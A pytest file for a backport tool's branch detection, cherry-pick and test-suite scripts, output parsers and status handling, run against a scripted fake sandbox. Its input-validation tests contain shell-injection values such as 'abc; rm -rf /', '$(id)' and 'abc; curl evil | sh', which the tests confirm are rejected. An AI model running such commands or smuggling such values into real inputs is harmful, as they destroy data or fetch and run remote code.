"""Backport mode: branch detection, the sandbox scripts and their parsers, and every status.

No network, no Docker and no paid call: the sandbox is a scripted fake that answers each kind of
script (baseline, reproduction run, cherry-pick, test suite) with canned output in the exact
format the real scripts print. The scripts themselves run for real in
tests/test_backport_docker.py.
"""

from __future__ import annotations

import asyncio
import base64
import json
from dataclasses import dataclass, field

import pytest

from fixedyet import backport as bp
from fixedyet.config import Settings
from fixedyet.envbuild import EnvBuildError
from fixedyet.models import (
    Assessment,
    BackportStatus,
    Confidence,
    ExecResult,
    Outcome,
    ProgressEvent,
    Reproduction,
    SideRun,
    SuiteRun,
    Verdict,
)
from fixedyet.sandbox.base import SandboxError

ISSUE = "https://github.com/acme/widgets/issues/42"
FIX = "d959898db264aaf07e70ad4eafa254286f9a5185"
HEAD = "b" * 40
PICKED = "c" * 40


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


# -- branch detection ------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("version", "branches", "expected"),
    [
        ("8.1.3", ["main", "8.1.x"], "8.1.x"),
        ("8.1.3", ["main", "v8.1.x"], "v8.1.x"),
        ("8.1.3", ["main", "stable/8.1"], "stable/8.1"),
        ("8.1.3", ["main", "stable-8.1"], "stable-8.1"),
        ("8.1.3", ["main", "release-8.1"], "release-8.1"),
        ("8.1.3", ["main", "release/8.1"], "release/8.1"),
        ("8.1.3", ["main", "releases/8.1.x"], "releases/8.1.x"),
        ("8.1.3", ["main", "maint/8.1"], "maint/8.1"),
        ("8.1.3", ["main", "maintenance/8.1"], "maintenance/8.1"),
        ("8.1.3", ["main", "8.1-maintenance"], "8.1-maintenance"),
        ("8.1.3", ["main", "8.1"], "8.1"),
        ("8.1.3", ["main", "release-8_1"], "release-8_1"),
        ("v2.31.0", ["main", "2.31.x"], "2.31.x"),
        ("24.1.2", ["main", "23.2", "24.1", "25.1"], "24.1"),
        ("2024.5.1", ["main", "2024.5.x"], "2024.5.x"),
        ("8.1.3", ["main", "8.x"], "8.x"),  # a major-only line is the fallback
        ("v8.1.3", ["main", "v8"], "v8"),
        ("3.26.0", ["dev", "2.x-line", "3.x-line"], "3.x-line"),
        ("1.10.9", ["main", "1.10.X-fixes"], "1.10.X-fixes"),
        ("8.1.3", ["main", "version-8.1"], "version-8.1"),
        ("8.1.3", ["main", "RELEASE-8.1"], "RELEASE-8.1"),
    ],
)
def test_the_branch_for_a_version_is_found_by_name(
    version: str, branches: list[str], expected: str
) -> None:
    assert bp.find_target_branch(version, branches).branch == expected


@pytest.mark.parametrize(
    ("version", "branches"),
    [
        ("8.1.3", ["main", "8.2.x", "8.0.x"]),  # other minor lines say nothing about 8.1
        ("8.1.3", ["main", "8.10.x", "8.11.x"]),  # 8.1 is not a prefix of 8.10
        ("8.1.3", ["main", "9.1.x"]),
        ("8.1.3", ["main", "stable"]),  # an unversioned branch is not a maintenance line
        ("8.1.3", ["main", "master", "develop", "feature-8.1"]),
        ("8.1.3", ["main", "8.1.3"]),  # a full version is a release, not a line
        ("8.1.3", ["main", "release-8.1.3"]),
        ("8.1.3", []),
        ("main", ["main", "8.1.x"]),  # the reported side ran a branch: no version to match
        ("1a2b3c4d5e6f", ["main", "1.x"]),  # a commit hash is not a version
        (None, ["main", "8.1.x"]),
    ],
)
def test_no_branch_is_chosen_when_none_fits(version: str | None, branches: list[str]) -> None:
    assert bp.find_target_branch(version, branches).branch is None


def test_the_same_minor_beats_a_major_line_and_the_plain_name_wins_ties() -> None:
    match = bp.find_target_branch("8.1.3", ["8.x", "release-8.1", "8.1.x", "stable/8.1", "8.1"])
    assert match.branch == "8.1.x"
    assert match.candidates[:2] == ["8.1.x", "8.1"] or match.candidates[0] == "8.1.x"
    assert "8.x" in match.candidates and match.candidates.index("8.x") > match.candidates.index(
        "stable/8.1"
    )


def test_maintenance_branches_of_other_versions_are_listed_for_the_hint() -> None:
    match = bp.find_target_branch("8.3.3", ["main", "stable", "8.2.x", "8.4.x", "fix-1"])
    assert match.branch is None
    assert match.maintenance == ["8.2.x", "8.4.x"]


def test_ls_remote_output_is_parsed_into_branches() -> None:
    text = (
        f"{'a' * 40}\trefs/heads/main\n"
        f"{'b' * 40}\trefs/heads/stable/8.1\n"
        "garbage line\n"
        f"{'c' * 40}\trefs/tags/v1\n"
    )
    assert bp.parse_ls_remote(text) == {"main": "a" * 40, "stable/8.1": "b" * 40}


async def test_list_remote_branches_runs_only_ls_remote(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[tuple[str, ...]] = []

    class Proc:
        returncode = 0

        async def communicate(self) -> tuple[bytes, bytes]:
            return f"{'a' * 40}\trefs/heads/8.1.x\n".encode(), b""

    async def fake_exec(*args: str, **_: object) -> Proc:
        seen.append(args)
        return Proc()

    monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_exec)
    assert await bp.list_remote_branches("acme/widgets") == {"8.1.x": "a" * 40}
    assert seen == [("git", "ls-remote", "--heads", "https://github.com/acme/widgets.git")]


async def test_list_remote_branches_failure_is_an_envbuild_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    class Proc:
        returncode = 128

        async def communicate(self) -> tuple[bytes, bytes]:
            return b"", b"fatal: repository not found"

    async def fake_exec(*args: str, **_: object) -> Proc:
        return Proc()

    monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_exec)
    with pytest.raises(EnvBuildError, match="repository not found"):
        await bp.list_remote_branches("acme/widgets")
    with pytest.raises(EnvBuildError, match="invalid repository"):
        await bp.list_remote_branches("not a repo; rm -rf")


# -- the scripts -----------------------------------------------------------------------------


def test_pick_script_cherry_picks_with_x_and_detects_merge_commits() -> None:
    script = bp.pick_script(FIX)
    assert 'git cherry-pick -x "$@"' in script and FIX in script
    assert "set -- -m 1" in script  # chosen only when the commit has two parents
    assert "wc -w)\" -gt 2" in script
    assert "git cherry-pick --abort" in script  # conflicts are aborted, never resolved
    assert "--diff-filter=U" in script
    assert "format-patch -1 --stdout --no-signature HEAD" in script
    assert "pip install -e" in script  # the reinstall
    assert "git fetch --quiet origin" in script  # when the commit is not in the clone


def test_pick_script_rejects_anything_that_is_not_a_commit_hash() -> None:
    for bad in ("main", "abc; rm -rf /", "$(id)", "d959898 && x", "", "zz12345"):
        with pytest.raises(EnvBuildError, match="invalid commit"):
            bp.pick_script(bad)


def test_suite_script_switches_off_plugins_that_replace_the_summary_line() -> None:
    # pytest-pretty (in pydantic's test dependencies) prints "Results (12.3s):" and a table in
    # place of "N passed in 12.3s"; parse_suite would then see no summary and call it not run.
    script = bp.suite_script()
    assert "-p no:pretty" in script and "-p no:sugar" in script


def test_suite_script_runs_everything_with_the_nine_hundred_second_limit() -> None:
    script = bp.suite_script()
    assert "timeout -k 10 900 env FIXEDYET_SUITE_REPORT=" in script
    assert "python -m pytest -q" in script
    assert "--maxfail=0" in script  # undoes a -x in the project's own addopts
    assert " -x" not in script
    assert "--continue-on-collection-errors" in script
    assert "-rfE" in script
    assert bp.suite_script(60).count("timeout -k 10 60 ") == 1


def test_pick_script_output_cannot_be_forged_by_git_text() -> None:
    script = bp.pick_script(FIX)
    assert "tail -n 40 /tmp/ir_pick.log | awk" in script  # git's own text is prefixed with '| '


# -- parsing the sandbox output ---------------------------------------------------------------

PATCH = (
    f"From {FIX} Mon Sep 17 00:00:00 2001\n"
    "From: Dev <dev@example.com>\n"
    "Subject: [PATCH] Keep the last item in parse()\n\n"
    "(cherry picked from commit d959898db264aaf07e70ad4eafa254286f9a5185)\n---\n"
    " widgets/__init__.py | 2 +-\n\n"
    "diff --git a/widgets/__init__.py b/widgets/__init__.py\n"
    "--- a/widgets/__init__.py\n+++ b/widgets/__init__.py\n@@ -1,2 +1,2 @@\n"
    " def parse(text):\n-    return text.split(',')[:-1]\n+    return text.split(',')\n"
)
MESSAGE = (
    "Keep the last item in parse()\n\nparse() dropped the final element.\n\n"
    "(cherry picked from commit d959898db264aaf07e70ad4eafa254286f9a5185)"
)


def pick_ok(*, merge: bool = False, image: str | None = "img-picked") -> ExecResult:
    out = f"__HEAD__={HEAD}\n" + ("__MERGE__=1\n" if merge else "")
    out += f"__PICKED__={PICKED}\n__MSG_B64__={b64(MESSAGE)}\n__PATCH_B64__={b64(PATCH)}\n"
    return ExecResult(exit_code=0, stdout=out, image=image)


def pick_conflict(files: tuple[str, ...] = ("CHANGES.rst", "src/widgets/core.py")) -> ExecResult:
    out = f"__HEAD__={HEAD}\n__PICK_FAILED__=1\n"
    out += "".join(f"__CONFLICT__={name}\n" for name in files)
    out += "| CONFLICT (content): Merge conflict in CHANGES.rst\n| error: could not apply d959898\n"
    return ExecResult(exit_code=30, stdout=out, image="img-conflict")


def test_a_clean_pick_is_parsed() -> None:
    pick = bp.parse_pick(pick_ok())
    assert pick.head == HEAD and pick.picked == PICKED and not pick.merge
    assert pick.message == MESSAGE
    assert pick.patch == PATCH
    assert not pick.pick_failed and pick.conflicts == [] and pick.setup_failed is None


def test_a_merge_commit_pick_is_flagged() -> None:
    assert bp.parse_pick(pick_ok(merge=True)).merge is True


def test_a_conflict_is_parsed_with_its_files_and_git_output() -> None:
    pick = bp.parse_pick(pick_conflict())
    assert pick.pick_failed and pick.conflicts == ["CHANGES.rst", "src/widgets/core.py"]
    assert pick.picked is None and pick.patch == ""
    assert pick.log.splitlines()[0] == "CONFLICT (content): Merge conflict in CHANGES.rst"
    assert "| " not in pick.log


def test_conflict_files_are_capped() -> None:
    names = tuple(f"f{i}.py" for i in range(200))
    assert len(bp.parse_pick(pick_conflict(names)).conflicts) == bp.MAX_CONFLICT_FILES


def test_a_failed_setup_step_is_named() -> None:
    result = ExecResult(
        exit_code=22,
        stdout="__HEAD__=x\n__PICKED__=y\n__SETUP_FAILED__=reinstall\n| ERROR: boom\n",
    )
    pick = bp.parse_pick(result)
    assert pick.setup_failed == "reinstall" and pick.log == "ERROR: boom"


def suite_output(
    *, passed: int = 120, failed: tuple[str, ...] = (), errors: tuple[str, ...] = (),
    skipped: int = 0, rc: int | None = None, summary: str | None = None, seconds: str = "12.34",
) -> ExecResult:
    lines = ["tests/test_a.py ........", "", "=== short test summary info ==="]
    lines += [f"FAILED {t} - AssertionError: assert 1 == 2" for t in failed]
    lines += [f"ERROR {t} - ImportError: No module named x" for t in errors]
    if summary is None:
        counts = []
        if failed:
            counts.append(f"{len(failed)} failed")
        counts.append(f"{passed} passed")
        if skipped:
            counts.append(f"{skipped} skipped")
        if errors:
            counts.append(f"{len(errors)} error{'s' if len(errors) != 1 else ''}")
        summary = ", ".join(counts) + f" in {seconds}s"
    lines.append(summary)
    code = rc if rc is not None else (1 if failed or errors else 0)
    return ExecResult(
        exit_code=0, stdout="\n".join(f"| {line}" for line in lines) + f"\n__RC__={code}\n"
    )


def test_a_passing_suite_is_counted() -> None:
    suite = bp.parse_suite(suite_output(passed=120, skipped=3))
    assert suite.ran and suite.exit_code == 0
    assert (suite.passed, suite.failed, suite.errors, suite.skipped) == (120, 0, 0, 3)
    assert suite.failing_tests == [] and suite.total == 123
    assert suite.duration_s == pytest.approx(12.34)
    assert "short test summary info" in suite.log_excerpt


def test_failing_and_erroring_tests_are_named() -> None:
    suite = bp.parse_suite(
        suite_output(
            passed=10,
            failed=("tests/test_a.py::test_x[1 - 2]", "tests/test_b.py::test_y"),
            errors=("tests/test_c.py",),
        )
    )
    assert suite.ran and suite.exit_code == 1
    assert (suite.passed, suite.failed, suite.errors) == (10, 2, 1)
    assert suite.failing_tests == [
        "tests/test_a.py::test_x[1", "tests/test_b.py::test_y", "tests/test_c.py",
    ]


def test_failing_ids_are_read_only_from_the_last_summary_section() -> None:
    noisy = ExecResult(
        exit_code=0,
        stdout=(
            "| FAILED tests/fake.py::from_captured_output - not a result\n"
            "| === short test summary info ===\n"
            "| FAILED tests/real.py::test_a - boom\n"
            "| 1 failed, 5 passed in 1.00s\n__RC__=1\n"
        ),
    )
    assert bp.parse_suite(noisy).failing_tests == ["tests/real.py::test_a"]


@pytest.mark.parametrize(
    "result",
    [
        suite_output(rc=124),  # timeout(1) killed it
        suite_output(rc=137),
        suite_output(rc=2),  # interrupted
        suite_output(rc=5, summary="no tests ran in 0.01s"),
        suite_output(summary="something odd"),  # no summary line at all
        ExecResult(exit_code=97, stderr="cannot enter workdir"),
    ],
)
def test_a_suite_that_did_not_finish_is_not_a_result(result: ExecResult) -> None:
    assert bp.parse_suite(result).ran is False


def test_a_sandbox_timeout_is_flagged() -> None:
    suite = bp.parse_suite(
        ExecResult(exit_code=124, stdout="| ...\n", timed_out=True, stderr="timed out")
    )
    assert suite.timed_out and not suite.ran
    assert "[sandbox run timed out]" in suite.log_excerpt


def report_output(
    report: dict | str, *, rc: int = 1, log: str = "tests/test_a.py ..F"
) -> ExecResult:
    """`suite_script` output with the plugin's JSON report and no summary line (``-qq``)."""
    raw = report if isinstance(report, str) else json.dumps(report)
    return ExecResult(exit_code=0, stdout=f"| {log}\n__SUITE_JSON_B64__={b64(raw)}\n__RC__={rc}\n")


def test_the_plugin_report_is_read_when_the_summary_line_is_missing() -> None:
    # cog's addopts "-q" plus our "-q" is -qq: pytest prints no "N passed in Xs" line at all
    suite = bp.parse_suite(report_output({
        "exitstatus": 1, "duration": 3.5,
        "counts": {"passed": 40, "failed": 1, "error": 1, "skipped": 2, "xfailed": 1},
        "failing": ["tests/test_a.py::test_x[1 - 2]", "tests/test_c.py"],
    }))
    assert suite.ran and suite.exit_code == 1
    assert (suite.passed, suite.failed, suite.errors, suite.skipped) == (40, 1, 1, 2)
    assert suite.failing_tests == ["tests/test_a.py::test_x[1 - 2]", "tests/test_c.py"]
    assert suite.duration_s == pytest.approx(3.5)


def test_the_plugin_report_wins_over_the_text() -> None:
    text = suite_output(passed=5, failed=("tests/t.py::from_text",)).stdout
    report = {"exitstatus": 1, "counts": {"passed": 9, "failed": 1}, "failing": ["t.py::real"]}
    stdout = text.replace("__RC__=1", f"__SUITE_JSON_B64__={b64(json.dumps(report))}\n__RC__=1")
    suite = bp.parse_suite(ExecResult(exit_code=0, stdout=stdout))
    assert (suite.passed, suite.failed) == (9, 1) and suite.failing_tests == ["t.py::real"]


@pytest.mark.parametrize(
    "report",
    [
        "{not json",
        '{"counts": {"passed": 3}}',  # no exit status
        '{"exitstatus": 0, "counts": {"passed": "many"}}',
        '{"exitstatus": 0, "counts": {"passed": -4}}',
        '[1, 2]',
    ],
)
def test_a_broken_report_falls_back_to_the_summary_line(report: str) -> None:
    text = suite_output(passed=7, failed=("tests/t.py::test_b",)).stdout
    stdout = text.replace("__RC__=1", f"__SUITE_JSON_B64__={b64(report)}\n__RC__=1")
    suite = bp.parse_suite(ExecResult(exit_code=0, stdout=stdout))
    assert suite.ran and (suite.passed, suite.failed) == (7, 1)
    assert suite.failing_tests == ["tests/t.py::test_b"]


def test_no_report_and_no_summary_line_is_not_a_result() -> None:
    suite = bp.parse_suite(ExecResult(exit_code=0, stdout="| ....F\n__RC__=1\n"))
    assert suite.ran is False


def test_the_report_of_a_run_that_did_not_finish_is_not_a_result() -> None:
    report = {"exitstatus": 2, "counts": {"passed": 3}, "failing": []}
    assert bp.parse_suite(report_output(report, rc=2)).ran is False
    assert bp.parse_suite(report_output({**report, "exitstatus": 0}, rc=124)).ran is False


def test_the_report_line_cannot_be_forged_by_test_output() -> None:
    # every line of pytest's log carries "| ", so a test printing the marker is only log text
    forged = f"__SUITE_JSON_B64__={b64(json.dumps({'exitstatus': 0, 'counts': {'passed': 1}}))}"
    result = ExecResult(exit_code=0, stdout=f"| {forged}\n__RC__=1\n")
    assert bp.parse_suite(result).ran is False


def test_suite_script_loads_the_plugin_only_when_it_was_shipped() -> None:
    script = bp.suite_script()
    (path, source), = bp.suite_files().items()
    assert path == f"{bp.SUITE_PLUGIN_DIR}/{bp.SUITE_PLUGIN}.py"
    assert "def pytest_runtest_logreport" in source
    assert f"[ -f {path} ] && ir_report='-p {bp.SUITE_PLUGIN}'" in script
    assert "$ir_report" in script and f"PYTHONPATH=\"{bp.SUITE_PLUGIN_DIR}" in script
    # the report is printed after the log, so a cut of the output keeps it
    assert script.index("tail -c") < script.index("__SUITE_JSON_B64__") < script.index("__RC__")


def test_the_plugin_counts_a_real_pytest_run_at_any_verbosity(tmp_path) -> None:
    """The shipped plugin, loaded by the local pytest at -qq: the run prints no summary line,
    and the report still has every count and the failing ids."""
    import os
    import subprocess
    import sys

    project = tmp_path / "proj"
    project.mkdir()
    (project / "pytest.ini").write_text("[pytest]\naddopts = -q\n")
    (project / "test_a.py").write_text(
        "import pytest\n"
        "def test_ok(): pass\n"
        "@pytest.mark.parametrize('x', ['1 - 2'])\n"
        "def test_bad(x): assert 0\n"
        "@pytest.fixture\ndef boom():\n    raise RuntimeError('x')\n"
        "def test_err(boom): pass\n"
        "@pytest.mark.skip\ndef test_skip(): pass\n"
        "@pytest.mark.xfail\ndef test_xf(): assert 0\n"
    )
    (project / "test_broken.py").write_text("import not_a_module_anywhere\n")
    plugins = tmp_path / "plugins"
    plugins.mkdir()
    for path, source in bp.suite_files().items():
        (plugins / path.rsplit("/", 1)[1]).write_text(source)
    report = tmp_path / "report.json"
    env = {**os.environ, "FIXEDYET_SUITE_REPORT": str(report), "PYTHONPATH": str(plugins)}
    run = subprocess.run(
        [sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider", "-p", bp.SUITE_PLUGIN,
         "--continue-on-collection-errors", "-rfE"],
        cwd=project, env=env, capture_output=True, text=True, timeout=120,
    )
    assert run.returncode == 1
    assert " passed" not in run.stdout.splitlines()[-1]  # -qq: no summary line
    suite = bp.parse_suite(report_output(report.read_text(), rc=run.returncode))
    assert suite.ran
    assert (suite.passed, suite.failed, suite.errors, suite.skipped) == (1, 1, 2, 1)
    assert set(suite.failing_tests) == {
        "test_a.py::test_bad[1 - 2]", "test_a.py::test_err", "test_broken.py",
    }


def test_newly_failing_ignores_what_failed_before() -> None:
    before = SuiteRun(ran=True, failed=1, failing_tests=["t::old"])
    after = SuiteRun(ran=True, failed=2, failing_tests=["t::old", "t::new"])
    assert bp.newly_failing(before, after) == ["t::new"]
    assert bp.newly_failing(after, before) == []


# -- a scripted sandbox ----------------------------------------------------------------------


def repro_output(codes: list[int], log: str = "1 failed in 0.01s") -> ExecResult:
    out = "".join(f"__RUN_START__={i}\n| {log}\n__RC__={rc}\n" for i, rc in enumerate(codes, 1))
    return ExecResult(exit_code=0, stdout=out)


@dataclass
class World:
    """What each kind of sandbox run answers. The defaults are a perfect, verified backport."""

    build: ExecResult | BaseException = field(
        default_factory=lambda: ExecResult(exit_code=0, stdout="__STEP__=done\n", image="img-base")
    )
    before: ExecResult = field(default_factory=lambda: repro_output([1, 1]))
    after: ExecResult = field(default_factory=lambda: repro_output([0, 0], "1 passed in 0.01s"))
    pick: ExecResult = field(default_factory=pick_ok)
    suite_before: ExecResult = field(default_factory=lambda: suite_output(passed=120))
    suite_after: ExecResult = field(default_factory=lambda: suite_output(passed=121))


@dataclass
class Call:
    kind: str
    image: str
    command: str
    timeout_s: int
    network: bool
    keep: bool
    files: dict[str, str] | None = None


class ScriptedSandbox:
    name = "scripted"

    def __init__(self, world: World | None = None) -> None:
        self.world = world or World()
        self.calls: list[Call] = []

    async def base_image(self, python_version: str | None) -> str:
        return f"base:{python_version or 'default'}"

    async def run(
        self, image: str, command: str, *, files: dict[str, str] | None = None,
        workdir: str = "/work", timeout_s: int = 900, keep: bool = False, network: bool = True,
    ) -> ExecResult:
        world = self.world
        if "__STEP__=clone" in command:
            kind, answer = "build", world.build
        elif "git cherry-pick -x" in command:
            kind, answer = "pick", world.pick
        elif "__RUN_START__" in command:
            kind = "repro-before" if image == "img-base" else "repro-after"
            answer = world.before if image == "img-base" else world.after
        elif "--maxfail=0" in command:
            kind = "suite-before" if image == "img-base" else "suite-after"
            answer = world.suite_before if image == "img-base" else world.suite_after
        else:  # pragma: no cover - a new kind of script needs a new branch here
            raise AssertionError(f"unexpected script: {command[:200]}")
        self.calls.append(Call(kind, image, command, timeout_s, network, keep, files))
        if isinstance(answer, BaseException):
            raise answer
        return answer

    def kinds(self) -> list[str]:
        return [c.kind for c in self.calls]


def assessment(
    *, verdict: Verdict = Verdict.FIXED_ON_MAIN, commit: str | None = FIX,
    reported_ref: str | None = "8.1.3", issue_url: str = ISSUE,
    test_code: str | None = "def test_x():\n    assert parse('a,b') == ['a', 'b']\n",
) -> Assessment:
    return Assessment(
        issue_url=issue_url,
        title="parse() drops the last item",
        verdict=verdict,
        confidence=Confidence.HIGH,
        reproduction=Reproduction(
            repro_test_path="tests/test_issue_repro.py",
            repro_test_code=test_code,
            reported_side=SideRun(ref=reported_ref, outcomes=[Outcome.FAIL, Outcome.FAIL])
            if reported_ref else None,
            fix_side=SideRun(ref="main", outcomes=[Outcome.PASS, Outcome.PASS]),
            fixing_commit=commit,
        ),
    )


BRANCHES = {"main": "a" * 40, "8.1.x": HEAD, "8.0.x": "d" * 40, "stable": "e" * 40}


async def lister(repo: str) -> dict[str, str]:
    assert repo == "acme/widgets"
    return dict(BRANCHES)


async def run(
    world: World | None = None, a: Assessment | None = None, **kwargs: object
) -> tuple[bp.BackportResult, ScriptedSandbox]:
    sandbox = ScriptedSandbox(world)
    result = await bp.backport(
        a or assessment(), sandbox=sandbox, list_branches=lister,
        settings=Settings(nebius_api_key="k"), **kwargs,  # type: ignore[arg-type]
    )
    return result, sandbox


# -- every status ----------------------------------------------------------------------------


async def test_verified() -> None:
    result, sandbox = await run()
    assert result.status is BackportStatus.VERIFIED
    assert result.target_branch == "8.1.x" and result.target_branch_head == HEAD
    assert result.repo == "acme/widgets" and result.reported_version == "8.1.3"
    assert result.fixing_commit == FIX and result.cherry_picked_commit == PICKED
    assert result.commit_message == MESSAGE and result.patch == PATCH
    assert [o.value for o in result.repro_before.outcomes] == ["fail", "fail"]
    assert [o.value for o in result.repro_after.outcomes] == ["pass", "pass"]
    assert (result.suite_before.passed, result.suite_after.passed) == (120, 121)
    assert result.newly_failing == [] and result.conflicting_files == []
    assert "no newly failing" in result.reason and "8.1.x" in result.reason
    assert result.repro_test_path == "tests/test_issue_repro.py"
    assert result.title == "parse() drops the last item"
    assert result.usage.sandbox_runs == 6 and result.usage.cost_usd == 0.0
    assert result.usage.wall_seconds >= 0
    assert sandbox.kinds() == [
        "build", "repro-before", "pick", "repro-after", "suite-before", "suite-after",
    ]


async def test_the_sandbox_steps_use_the_branch_head_images_and_limits() -> None:
    result, sandbox = await run()
    by_kind = {c.kind: c for c in sandbox.calls}
    assert HEAD in by_kind["build"].command  # a fresh checkout of the branch head, pinned
    assert by_kind["repro-before"].image == "img-base"
    assert by_kind["pick"].image == "img-base" and by_kind["pick"].keep is True
    assert by_kind["repro-after"].image == "img-picked"  # a fork of the cherry-picked tree
    for kind in ("suite-before", "suite-after"):
        assert by_kind[kind].timeout_s >= 900
        assert "timeout -k 10 900 env FIXEDYET_SUITE_REPORT=" in by_kind[kind].command
        assert by_kind[kind].files == bp.suite_files()  # the plugin that writes the report
        assert " -x" not in by_kind[kind].command
        assert by_kind[kind].network is False  # the project's tests are untrusted code
    assert by_kind["suite-before"].image == "img-base"
    assert by_kind["suite-after"].image == "img-picked"
    assert result.status is BackportStatus.VERIFIED


async def test_conflicts_report_the_files_and_stop_without_resolving_anything() -> None:
    result, sandbox = await run(World(pick=pick_conflict()))
    assert result.status is BackportStatus.CONFLICTS
    assert result.conflicting_files == ["CHANGES.rst", "src/widgets/core.py"]
    assert "CHANGES.rst" in result.reason and "aborted" in result.reason
    assert result.patch == "" and result.cherry_picked_commit is None
    assert result.repro_after is None and result.suite_after is None and result.suite_before is None
    assert sandbox.kinds() == ["build", "repro-before", "pick"]  # no model, no retry, no suites
    assert "CONFLICT (content)" in result.log_excerpt


async def test_regression_names_the_newly_failing_tests() -> None:
    world = World(
        suite_before=suite_output(passed=119, failed=("tests/test_a.py::test_old",)),
        suite_after=suite_output(
            passed=117, failed=("tests/test_a.py::test_old", "tests/test_b.py::test_new1",
                                "tests/test_b.py::test_new2"),
        ),
    )
    result, _ = await run(world)
    assert result.status is BackportStatus.REGRESSION
    assert result.newly_failing == ["tests/test_b.py::test_new1", "tests/test_b.py::test_new2"]
    assert result.patch == PATCH  # kept: a person may want to look at it
    assert "2 test(s) fail now" in result.reason


async def test_a_test_that_failed_before_is_not_a_regression() -> None:
    world = World(
        suite_before=suite_output(passed=119, failed=("tests/test_a.py::test_old",)),
        suite_after=suite_output(passed=120, failed=("tests/test_a.py::test_old",)),
    )
    result, _ = await run(world)
    assert result.status is BackportStatus.VERIFIED
    assert result.suite_before.failing_tests == result.suite_after.failing_tests


async def test_a_rising_failure_count_without_readable_ids_is_still_a_regression() -> None:
    world = World(
        suite_before=suite_output(passed=119, failed=("t::a",)),
        suite_after=suite_output(
            passed=118, failed=("t::a",), summary="2 failed, 118 passed in 1.0s"
        ),
    )
    result, _ = await run(world)
    assert result.status is BackportStatus.REGRESSION
    assert result.newly_failing == [] and "rose from 1 to 2" in result.reason


async def test_already_fixed_on_branch_when_the_test_passes_before_the_pick() -> None:
    result, sandbox = await run(World(before=repro_output([0, 0], "1 passed in 0.01s")))
    assert result.status is BackportStatus.ALREADY_FIXED_ON_BRANCH
    assert "8.1.x" in result.reason
    assert result.patch == "" and result.repro_after is None
    assert sandbox.kinds() == ["build", "repro-before"]


@pytest.mark.parametrize("codes", [[1, 0], [2, 2], [1, 2]])
async def test_a_test_that_does_not_fail_cleanly_before_is_an_error(codes: list[int]) -> None:
    result, sandbox = await run(World(before=repro_output(codes)))
    assert result.status is BackportStatus.ERROR
    assert "clean failure" in result.reason
    assert sandbox.kinds() == ["build", "repro-before"]


async def test_a_test_that_still_fails_after_the_pick_is_an_error_not_verified() -> None:
    result, sandbox = await run(World(after=repro_output([1, 1])))
    assert result.status is BackportStatus.ERROR
    assert "does not pass" in result.reason and "other changes" in result.reason
    assert result.patch == PATCH
    assert sandbox.kinds() == ["build", "repro-before", "pick", "repro-after"]  # no suites


async def test_a_flaky_test_after_the_pick_is_an_error() -> None:
    result, _ = await run(World(after=repro_output([0, 1])))
    assert result.status is BackportStatus.ERROR


async def test_a_suite_that_cannot_run_before_means_no_verification() -> None:
    world = World(suite_before=suite_output(rc=124))
    result, sandbox = await run(world)
    assert result.status is BackportStatus.ERROR
    assert "could not be run" in result.reason and "unverified" in result.reason
    assert result.patch == PATCH and result.suite_after is None
    assert sandbox.kinds()[-1] == "suite-before"


async def test_a_suite_that_cannot_run_after_means_no_verification() -> None:
    result, _ = await run(World(suite_after=suite_output(rc=2)))
    assert result.status is BackportStatus.ERROR
    assert "after the cherry-pick" in result.reason
    assert result.suite_before.ran and result.suite_after.ran is False


async def test_a_suite_timeout_is_reported_as_one() -> None:
    timed_out = ExecResult(exit_code=124, stdout="| .....\n", timed_out=True)
    result, _ = await run(World(suite_before=timed_out))
    assert result.status is BackportStatus.ERROR and "timed out" in result.reason


async def test_a_pick_that_fails_without_a_conflict_is_an_error() -> None:
    empty = ExecResult(
        exit_code=30,
        stdout=f"__HEAD__={HEAD}\n__PICK_FAILED__=1\n| The previous cherry-pick is now empty\n",
    )
    result, _ = await run(World(pick=empty))
    assert result.status is BackportStatus.ERROR
    assert "without a conflict" in result.reason and "empty" in result.log_excerpt


async def test_a_reinstall_failure_is_an_error() -> None:
    failed = ExecResult(
        exit_code=22,
        stdout=(
            f"__HEAD__={HEAD}\n__PICKED__={PICKED}\n__SETUP_FAILED__=reinstall\n"
            "| ERROR: no wheel\n"
        ),
    )
    result, _ = await run(World(pick=failed))
    assert result.status is BackportStatus.ERROR and "reinstall" in result.reason


async def test_a_missing_checkpoint_or_patch_is_an_error() -> None:
    result, _ = await run(World(pick=pick_ok(image=None)))
    assert result.status is BackportStatus.ERROR


async def test_a_pick_timeout_is_an_error() -> None:
    result, _ = await run(World(pick=ExecResult(exit_code=124, timed_out=True)))
    assert result.status is BackportStatus.ERROR and "timed out" in result.reason


async def test_a_sandbox_failure_is_an_error_result_not_an_exception() -> None:
    result, _ = await run(World(build=SandboxError("docker daemon is not running")))
    assert result.status is BackportStatus.ERROR
    assert "docker daemon is not running" in result.reason


async def test_a_baseline_build_failure_is_an_error_result() -> None:
    failing = ExecResult(
        exit_code=12, stdout="__STEP__=install\n", stderr="ERROR: no matching distribution"
    )
    result, _ = await run(World(build=failing))
    assert result.status is BackportStatus.ERROR and "install" in result.reason


async def test_a_branch_listing_failure_is_an_error_result() -> None:
    async def broken(repo: str) -> dict[str, str]:
        raise EnvBuildError("git ls-remote failed for acme/widgets: no route to host")

    result = await bp.backport(
        assessment(), sandbox=ScriptedSandbox(), list_branches=broken, settings=Settings()
    )
    assert result.status is BackportStatus.ERROR and "no route to host" in result.reason


# -- not applicable -----------------------------------------------------------------------------


@pytest.mark.parametrize("verdict", [v for v in Verdict if v is not Verdict.FIXED_ON_MAIN])
async def test_only_a_bug_fixed_on_main_has_anything_to_backport(verdict: Verdict) -> None:
    result, sandbox = await run(a=assessment(verdict=verdict))
    assert result.status is BackportStatus.NOT_APPLICABLE
    assert verdict.value in result.reason and sandbox.calls == []


async def test_an_unknown_fixing_commit_is_reported_as_such() -> None:
    result, sandbox = await run(a=assessment(commit=None))
    assert result.status is BackportStatus.NOT_APPLICABLE
    assert "unknown" in result.reason and "squashed" in result.reason
    assert sandbox.calls == []


async def test_a_fixing_commit_that_is_not_a_hash_is_refused_before_any_shell_sees_it() -> None:
    result, sandbox = await run(a=assessment(commit="abc; curl evil | sh"))
    assert result.status is BackportStatus.ERROR and sandbox.calls == []


async def test_no_maintenance_branch_for_the_version() -> None:
    result, sandbox = await run(a=assessment(reported_ref="9.3.1"))
    assert result.status is BackportStatus.NOT_APPLICABLE
    assert "no maintenance branch" in result.reason and "9.3.1" in result.reason
